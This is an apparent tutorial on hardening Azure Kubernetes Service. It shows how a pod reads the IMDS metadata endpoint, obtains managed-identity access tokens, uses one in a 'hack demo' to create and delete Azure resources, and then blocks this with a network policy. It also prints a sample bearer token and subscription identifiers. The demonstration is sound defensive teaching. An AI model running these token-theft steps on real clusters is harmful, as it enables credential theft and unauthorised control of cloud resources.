# AKS Security: Deny access to IMDS metadata endpoint

## Introduction

The Azure Instance Metadata Service (IMDS) provides information about currently running virtual machine instances. 
You can use it to manage and configure your virtual machines. 
This information includes the SKU, storage, network configurations, and upcoming maintenance events.

IMDS is a REST API that's available at a well-known, non-routable IP address (169.254.169.254). 
You can only access it from within the VM. 
Communication between the VM and IMDS never leaves the host.

Kubelet has its own Managed Identity (MSI) attached to AKS. 
Kubelet uses IMDS endpoint to access the MSI and get an access token.
These credentials can be accessed by the kubelet via the instance metadata service (IMDS). 
IMDS can be accessed via an HTTP request on a link-local IP address: `169.254.169.254`. 
By default, this metadata service is reachable to all pods on the nodes.

![](images/54_deny_access_imds__architecture.png)

More information about IMDS here:

https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service?tabs=linux

# 1. Setup environment

```sh
$AKS_RG="rg-aks-cluster"
$AKS_NAME="aks-cluster"

az group create -n $AKS_RG -l westeurope

az aks create -g $AKS_RG -n $AKS_NAME `
              --kubernetes-version "1.25.5" `
              --node-count 3 `
              --network-plugin azure

az aks get-credentials -n $AKS_NAME -g $AKS_RG --overwrite-existing
```

# 2. Get AKS Managed Identities attached to the cluster (VMSS)

```sh
az vmss identity show -g rg-spoke-aks-nodes -n aks-poolsystem-97210295-vmss # replace with your vmss name & rg
# {
#   "principalId": null,
#   "tenantId": null,
#   "type": "UserAssigned",
#   "userAssignedIdentities": {
#     "/subscriptions/82f6d75e-85f4-434a-ab74-5dddd9fa8910/resourceGroups/rg-spoke-aks-cluster/providers/Microsoft.ManagedIdentity/userAssignedIdentities/identity-kubelet": {
#       "clientId": "e5dbcd30-9b3d-4041-b791-ac23f9038175",
#       "principalId": "71e2eea4-664f-4942-8a74-807619b56260"
#     },
#     "/subscriptions/82f6d75e-85f4-434a-ab74-5dddd9fa8910/resourcegroups/rg-spoke-aks-nodes/providers/Microsoft.ManagedIdentity/userAssignedIdentities/azurekeyvaultsecretsprovider-aks-cluster": {
#       "clientId": "584595ea-101a-4890-b074-1b65f6e11237",
#       "principalId": "fbc2e97f-82a5-47f9-ae25-75e47332c624"
#     },
#     "/subscriptions/82f6d75e-85f4-434a-ab74-5dddd9fa8910/resourcegroups/rg-spoke-aks-nodes/providers/Microsoft.ManagedIdentity/userAssignedIdentities/azurepolicy-aks-cluster": {
#       "clientId": "c8c86678-2bb0-4435-b9c3-0c9d3b657a25",
#       "principalId": "b62ac7a4-999d-4dd9-8696-5b91e9b0e6d1"
#     },
#     "/subscriptions/82f6d75e-85f4-434a-ab74-5dddd9fa8910/resourcegroups/rg-spoke-aks-nodes/providers/Microsoft.ManagedIdentity/userAssignedIdentities/ingressapplicationgateway-aks-cluster": {
#       "clientId": "21493e25-fc65-4f45-bb47-45dbf2449cab",
#       "principalId": "2bc9e0c4-4edd-4c1b-9972-3a095d2bdce6"
#     }
#   }
# }
```

## 3. View IMDS metadata endpoint and exposed information

Create azure-cli pod

```sh
kubectl run azure-cli -it --rm --image=mcr.microsoft.com/azure-cli:latest -- bash
```

Inside azure-cli pod, access IMDS metadata endpoint and view information

```sh
curl -s -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance?api-version=2021-12-13" | jq
```

<details><summary>View full JSON response from IMDS</summary>

```json
{
  "compute": {
    "additionalCapabilities": {
      "hibernationEnabled": "false"
    },
    "azEnvironment": "AzurePublicCloud",
    "customData": "",
    "evictionPolicy": "",
    "extendedLocation": {
      "name": "",
      "type": ""
    },
    "host": {
      "id": ""
    },
    "hostGroup": {
      "id": ""
    },
    "isHostCompatibilityLayerVm": "false",
    "licenseType": "",
    "location": "westeurope",
    "name": "aks-poolapps01-23151169-vmss_0",
    "offer": "",
    "osProfile": {
      "adminUsername": "azureuser",
      "computerName": "aks-poolapps01-23151169-vmss000000",
      "disablePasswordAuthentication": "true"
    },
    "osType": "Linux",
    "placementGroupId": "a9c98423-c446-4bd3-bc2d-8b9426cd2eed",
    "plan": {
      "name": "",
      "product": "",
      "publisher": ""
    },
    "platformFaultDomain": "0",
    "platformSubFaultDomain": "",
    "platformUpdateDomain": "0",
    "priority": "",
    "provider": "Microsoft.Compute",
    "publicKeys": [
      {
        "keyData": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDR5K+xn85+u/lKFMkjSKiuq8O2XdRcNmiGhEFzuXwT0z/p/4MDFI+kZ5yXuJsPucUC4au27KMVp/I565aLJRnvy796V61Dt4q42QrsuAf17fTTHzah3e5mTRsLqaQgQdHESA5Wiyw2GkkPF2k3DzQ31xjev61HW2DiT6285eZmC4h/OOiDP3QwivusMRaO3MvGGekHNFIwc3UHRdia3KflY5sskqDlLGKhmeECCNT+XhKA0fDItmgdR9Lxo5TWbw0M5KOiWcF5OjK8nuSWQ5F+b0WHpOJHVsUPWXtu0NXO0LDWsK+0FlVBwKAAX2ZMWtBka9a1XBo1tyCM2r64i7TW9oLIQ4brTfuIX41Z3ZeRjc/Qj1Yf7MSGENeUuj7ESS7zwBlwwBGIemI5gM6MRkHIcjSUq89DI3kpXTlOpFqzzYTK7UY+2pHUcza1sS7jU42WoBlLtt5PgM/Dq6jWM34bxn447ojh7xI+L/4fEkgnwvFpSeSjsuiz5nIQwqF9kobncM5m5md9HwjQIAAwPooVFQzUQbo9EgoMTM1hJtq+iJkjQR9HhFql2A7aH+NBjjuMUG+AcK9cq92wP+krhrqjGXeNCpisz+6J8+dTpH5e+HbiUN0RpOtyFCxBHomXZCQPvOUaco7G//bLMRd7QdW0a2xst148CJaRLZNtBoafRw==\n",
        "path": "/home/azureuser/.ssh/authorized_keys"
      }
    ],
    "publisher": "",
    "resourceGroupName": "rg-spoke-aks-nodes",
    "resourceId": "/subscriptions/82f6d75e-85f4-434a-ab74-5dddd9fa8910/resourceGroups/rg-spoke-aks-nodes/providers/Microsoft.Compute/virtualMachineScaleSets/aks-poolapps01-23151169-vmss/virtualMachines/0",
    "securityProfile": {
      "encryptionAtHost": "false",
      "secureBootEnabled": "false",
      "securityType": "",
      "virtualTpmEnabled": "false"
    },
    "sku": "",
    "storageProfile": {
      "dataDisks": [],
      "imageReference": {
        "id": "/subscriptions/109a5e88-712a-48ae-9078-9ca8b3c81345/resourceGroups/AKS-Ubuntu/providers/Microsoft.Compute/galleries/AKSUbuntu/images/2204gen2arm64containerd/versions/2023.02.09",
        "offer": "",
        "publisher": "",
        "sku": "",
        "version": ""
      },
      "osDisk": {
        "caching": "ReadOnly",
        "createOption": "FromImage",
        "diffDiskSettings": {
          "option": "Local"
        },
        "diskSizeGB": "60",
        "encryptionSettings": {
          "diskEncryptionKey": {
            "secretUrl": "",
            "sourceVault": {
              "id": ""
            }
          },
          "enabled": "false",
          "keyEncryptionKey": {
            "keyUrl": "",
            "sourceVault": {
              "id": ""
            }
          }
        },
        "image": {
          "uri": ""
        },
        "managedDisk": {
          "id": "/subscriptions/82f6d75e-85f4-434a-ab74-5dddd9fa8910/resourceGroups/rg-spoke-aks-nodes/providers/Microsoft.Compute/disks/aks-poolapps01-23151aks-poolapps01-231511OS__1_78bbc7d39b3443fb999d545048bf36dc",
          "storageAccountType": "Standard_LRS"
        },
        "name": "aks-poolapps01-23151aks-poolapps01-231511OS__1_78bbc7d39b3443fb999d545048bf36dc",
        "osType": "Linux",
        "vhd": {
          "uri": ""
        },
        "writeAcceleratorEnabled": "false"
      },
      "resourceDisk": {
        "size": "76800"
      }
    },
    "subscriptionId": "82f6d75e-85f4-434a-ab74-5dddd9fa8910",
    "tags": "aks-managed-coordination:true;aks-managed-createOperationID:7dd4e306-b65f-4c31-9b39-3a843eef5b19;aks-managed-creationSource:vmssclient-aks-poolapps01-23151169-vmss;aks-managed-enable-apiserver-vnet-integration:true;aks-managed-kubeletIdentityClientID:e5dbcd30-9b3d-4041-b791-ac23f9038175;aks-managed-orchestrator:Kubernetes:1.25.5;aks-managed-poolName:poolapps01;aks-managed-resourceNameSuffix:35064155;architecture:Hub&Spoke;environment:development;source:terraform",
    "tagsList": [
      {
        "name": "aks-managed-coordination",
        "value": "true"
      },
      {
        "name": "aks-managed-createOperationID",
        "value": "7dd4e306-b65f-4c31-9b39-3a843eef5b19"
      },
      {
        "name": "aks-managed-creationSource",
        "value": "vmssclient-aks-poolapps01-23151169-vmss"
      },
      {
        "name": "aks-managed-enable-apiserver-vnet-integration",
        "value": "true"
      },
      {
        "name": "aks-managed-kubeletIdentityClientID",
        "value": "e5dbcd30-9b3d-4041-b791-ac23f9038175"
      },
      {
        "name": "aks-managed-orchestrator",
        "value": "Kubernetes:1.25.5"
      },
      {
        "name": "aks-managed-poolName",
        "value": "poolapps01"
      },
      {
        "name": "aks-managed-resourceNameSuffix",
        "value": "35064155"
      },
      {
        "name": "architecture",
        "value": "Hub&Spoke"
      },
      {
        "name": "environment",
        "value": "development"
      },
      {
        "name": "source",
        "value": "terraform"
      }
    ],
    "userData": "",
    "version": "",
    "virtualMachineScaleSet": {
      "id": ""
    },
    "vmId": "39e69779-0b46-4b54-a293-5ed1a0dc3117",
    "vmScaleSetName": "aks-poolapps01-23151169-vmss",
    "vmSize": "Standard_D2pds_v5",
    "zone": "2"
  },
  "network": {
    "interface": [
      {
        "ipv4": {
          "ipAddress": [
            {
              "privateIpAddress": "10.1.5.4",
              "publicIpAddress": ""
            }
          ],
          "subnet": [
            {
              "address": "10.1.5.0",
              "prefix": "24"
            }
          ]
        },
        "ipv6": {
          "ipAddress": []
        },
        "macAddress": "000D3ABE51D2"
      }
    ]
  }
}
```

</details>

## 4. Get the MSI Kubelet Client ID from the tagsList

```sh
curl -s -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance?api-version=2021-12-13" | jq .compute.tagsList[4].value
# "e5dbcd30-9b3d-4041-b791-ac23f9038175"

MSI_KUBELET_CLIENT_ID=$(curl -s -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance?api-version=2021-12-13" | jq .compute.tagsList[4].value --raw-output)
echo $MSI_KUBELET_CLIENT_ID
# e5dbcd30-9b3d-4041-b791-ac23f9038175
```

# 5. Get the access token for the MSI Kubelet Client ID

```sh
curl -s -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-12-13&resource=https://management.azure.com/&client_id=$MSI_KUBELET_CLIENT_ID" | jq
# {
#     "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ii1LSTNROW5OUjdiUm9meG1lWm9YcWJIWkdldyIsImtpZCI6Ii1LSTNROW5OUjdiUm9meG1lWm9YcWJIWkdldyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzE2YjNjMDEzLWQzMDAtNDY4ZC1hYzY0LTdlZGEwODIwYjZkMy8iLCJpYXQiOjE2Nzc4NTQ3ODEsIm5iZiI6MTY3Nzg1NDc4MSwiZXhwIjoxNjc3OTQxNDgxLCJhaW8iOiJFMlpnWUxCYXVXbmpwbXZzY2FiWEk5OWJKa3dzQVFBPSIsImFwcGlkIjoiMjE0OTNlMjUtZmM2NS00ZjQ1LWJiNDctNDVkYmYyNDQ5Y2FiIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMTZiM2MwMTMtZDMwMC00NjhkLWFjNjQtN2VkYTA4MjBiNmQzLyIsImlkdHlwIjoiYXBwIiwib2lkIjoiMmJjOWUwYzQtNGVkZC00YzFiLTk5NzItM2EwOTVkMmJkY2U2IiwicmgiOiIwLkFBQUFFOEN6RmdEVGpVYXNaSDdhQ0NDMjAwWklmM2tBdXRkUHVrUGF3ZmoyTUJPOEFBQS4iLCJzdWIiOiIyYmM5ZTBjNC00ZWRkLTRjMWItOTk3Mi0zYTA5NWQyYmRjZTYiLCJ0aWQiOiIxNmIzYzAxMy1kMzAwLTQ2OGQtYWM2NC03ZWRhMDgyMGI2ZDMiLCJ1dGkiOiJuNkU4a2MzVUhrNnJycHhrNVp0Q0FnIiwidmVyIjoiMS4wIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvODJmNmQ3NWUtODVmNC00MzRhLWFiNzQtNWRkZGQ5ZmE4OTEwL3Jlc291cmNlZ3JvdXBzL3JnLXNwb2tlLWFrcy1ub2Rlcy9wcm92aWRlcnMvTWljcm9zb2Z0Lk1hbmFnZWRJZGVudGl0eS91c2VyQXNzaWduZWRJZGVudGl0aWVzL2luZ3Jlc3NhcHBsaWNhdGlvbmdhdGV3YXktYWtzLWNsdXN0ZXIiLCJ4bXNfdGNkdCI6MTY0NTEzNzIyOH0.hS5qKPqnc3OrEPTqXbuyz8uYULRo8Ii9a2t0XCq9SkNztb_31SyJ6XC4KSAVrE-IStVPyd5IGTDT14uo2VcbwbqnmBCQ-hyq35NIYI_h5bgX2IGSNRPDGsM_RKZdgijKLJ6w3whfdOx--8YDVvnh7MHqC0jNbAfW5i9RFjD5UkxVaLRJR-1NYHUkAdbevk-UvS1BMcoWgEN9fgs2gApwT0Ik6hbz8_P2dPZeBK1-uvBoLSNZ3YR2zYgWEhWSE41G6rsBqX1fTp3QS2rVKLEn99utVqnpwFltkQPeX5xXjP9IJf-V-zALo5-3B8TA6pnwN6zOzdSap5WYd4v6jObCTg",
#     "client_id": "21493e25-fc65-4f45-bb47-45dbf2449cab",
#     "expires_in": "86400",
#     "expires_on": "1677941481",
#     "ext_expires_in": "86399",
#     "not_before": "1677854781",
#     "resource": "https://management.azure.com/",
#     "token_type": "Bearer"
# }
```

Decode accessToken on http://jwt.io

# 6. Hack demo: use attached MSI to create and destroy resources in Azure

Get the resource ID (or client ID or Object ID) for any attached MSI

```sh
MSI_RESOURCE_ID="/subscriptions/82f6d75e-85f4-434a-ab74-5dddd9fa8910/resourcegroups/rg-spoke-aks-nodes/providers/Microsoft.ManagedIdentity/userAssignedIdentities/ingressapplicationgateway-aks-cluster" # REPLACE WITH YOUR MSI ATTACHED TO AKS VMSS

# login to Azure using MSI

az login --identity -u $MSI_RESOURCE_ID

az resource list

az resource list -o table
# Name                                         ResourceGroup       Location    Type                                              Status
# -------------------------------------------  ------------------  ----------  ------------------------------------------------  --------
# appgw-aks                                    rg-spoke-aks        westeurope  Microsoft.Network/applicationGateways
# aks-poolappsamd-37277643-vmss                rg-spoke-aks-nodes  westeurope  Microsoft.Compute/virtualMachineScaleSets
# aks-poolsystem-97210295-vmss                 rg-spoke-aks-nodes  westeurope  Microsoft.Compute/virtualMachineScaleSets
# azurekeyvaultsecretsprovider-aks-cluster     rg-spoke-aks-nodes  westeurope  Microsoft.ManagedIdentity/userAssignedIdentities
# azurepolicy-aks-cluster                      rg-spoke-aks-nodes  westeurope  Microsoft.ManagedIdentity/userAssignedIdentities
# ingressapplicationgateway-aks-cluster        rg-spoke-aks-nodes  westeurope  Microsoft.ManagedIdentity/userAssignedIdentities
# kube-apiserver                               rg-spoke-aks-nodes  westeurope  Microsoft.Network/loadBalancers
# kubernetes                                   rg-spoke-aks-nodes  westeurope  Microsoft.Network/loadBalancers
# aks-agentpool-35064155-nsg                   rg-spoke-aks-nodes  westeurope  Microsoft.Network/networkSecurityGroups
# 5c8fb48e-2b5a-4ea4-8d77-de410300353a         rg-spoke-aks-nodes  westeurope  Microsoft.Network/publicIPAddresses
# aca84a69-3447-4c06-af3a-205718135fbf         rg-spoke-aks-nodes  westeurope  Microsoft.Network/publicIPAddresses
# kubernetes-a566d7d000a6c4a0eae1c6a18af72faf  rg-spoke-aks-nodes  westeurope  Microsoft.Network/publicIPAddresses
```

Create a storage account

```sh
az storage account create -n stortobedeletedbyhacker -g rg-spoke-aks-nodes
# successfuly created

az resource list -o table
# Name                                         ResourceGroup       Location    Type                                              Status
# -------------------------------------------  ------------------  ----------  ------------------------------------------------  --------
# appgw-aks                                    rg-spoke-aks        westeurope  Microsoft.Network/applicationGateways
# aks-poolappsamd-37277643-vmss                rg-spoke-aks-nodes  westeurope  Microsoft.Compute/virtualMachineScaleSets
# aks-poolsystem-97210295-vmss                 rg-spoke-aks-nodes  westeurope  Microsoft.Compute/virtualMachineScaleSets
# azurekeyvaultsecretsprovider-aks-cluster     rg-spoke-aks-nodes  westeurope  Microsoft.ManagedIdentity/userAssignedIdentities
# azurepolicy-aks-cluster                      rg-spoke-aks-nodes  westeurope  Microsoft.ManagedIdentity/userAssignedIdentities
# ingressapplicationgateway-aks-cluster        rg-spoke-aks-nodes  westeurope  Microsoft.ManagedIdentity/userAssignedIdentities
# kube-apiserver                               rg-spoke-aks-nodes  westeurope  Microsoft.Network/loadBalancers
# kubernetes                                   rg-spoke-aks-nodes  westeurope  Microsoft.Network/loadBalancers
# aks-agentpool-35064155-nsg                   rg-spoke-aks-nodes  westeurope  Microsoft.Network/networkSecurityGroups
# 5c8fb48e-2b5a-4ea4-8d77-de410300353a         rg-spoke-aks-nodes  westeurope  Microsoft.Network/publicIPAddresses
# aca84a69-3447-4c06-af3a-205718135fbf         rg-spoke-aks-nodes  westeurope  Microsoft.Network/publicIPAddresses
# kubernetes-a566d7d000a6c4a0eae1c6a18af72faf  rg-spoke-aks-nodes  westeurope  Microsoft.Network/publicIPAddresses
# stortobedeletedbyhacker                      rg-spoke-aks-nodes  westeurope  Microsoft.Storage/storageAccounts

# Delete the storage account

az storage account delete -n stortobedeletedbyhacker -g rg-spoke-aks-nodes
# successfuly deleted
```

Exit from azure-cli pod

# 7. Network Policy to the rescue; deny access to IMDS endpoint

```sh
kubectl apply -f network-policy-deny-imds.yaml
```

# 8. Validate that access to IMDS is now denied

```sh
kubectl run azure-cli -it --rm --image=mcr.microsoft.com/azure-cli:latest -- bash
```

Run these commands inside azure-cli pod

Try access to IMDS endpoint; it should fail

```sh
curl -s -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance?api-version=2021-12-13" | jq

# login to Azure using MSI; it should fail

az login --identity -u $MSI_RESOURCE_ID
```

# 9. Additional notes

We can allow access to IMDS endpoint only for specific pods like Secret Store CSI, AGIC, OMS agent, etc.

InspectorGadget is a pod that can detect access to IMDS endpoint: https://github.com/jelledruyts/InspectorGadget

## Resources:
https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service?tabs=windows
